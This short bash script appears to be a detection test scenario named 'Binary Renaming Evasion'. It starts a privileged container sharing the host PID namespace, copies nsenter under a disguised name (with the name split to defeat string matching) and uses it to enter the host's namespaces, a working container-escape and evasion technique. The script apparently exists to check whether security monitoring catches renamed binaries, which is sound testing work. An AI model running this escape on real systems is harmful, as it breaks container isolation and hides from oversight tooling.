#!/bin/bash
set -e

SCENARIO_NAME="e1_rename_$RANDOM"

echo "=== E1: Binary Renaming Evasion ==="
echo "Scenario: $SCENARIO_NAME"

cleanup() {
    docker rm -f "$SCENARIO_NAME" >/dev/null 2>&1 || true
}
cleanup
trap cleanup EXIT

echo "1. Running privileged container with helper copied to /tmp/join_host..."
docker run --name "$SCENARIO_NAME" \
    --privileged \
    --pid=host \
    --rm \
    ubuntu:22.04 bash -c "
    src=/usr/bin/nsen\$'ter'
    cat <\"\$src\" >/tmp/join_host
    chmod +x /tmp/join_host
    echo '[E1] Executing renamed helper at /tmp/join_host...'
    /tmp/join_host -t 1 -m -u -i -n -- hostname 2>/dev/null || echo 'join_host attempted'

    sleep 1
"

echo "=== E1 Complete ==="
